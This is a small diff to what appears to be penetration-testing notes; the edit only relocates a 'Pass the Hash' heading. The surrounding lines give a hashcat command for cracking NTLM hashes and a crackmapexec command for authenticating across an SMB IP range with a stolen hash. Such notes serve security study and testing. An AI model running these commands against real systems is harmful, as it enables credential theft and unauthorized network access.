@@ -223,8 +223,10 @@ To crack the hashes of the local users, we are going to use hashcat again. Note,
 
 syntax: hashcat.exe -m 1000 /home/hacker/test.txt /usr/share/wordlists/rockyou.txt -O (on Windows, -m 1000 for NTLM)
 
+Pass the Hash
+
 Now, to pass the hash, we are going to use crackmapexec. 
 
 syntax: crackmapexec smb IPRANGE -u "User Name"/userlogin -H <HASH> --local-auth
 
-Pass the Hash
+
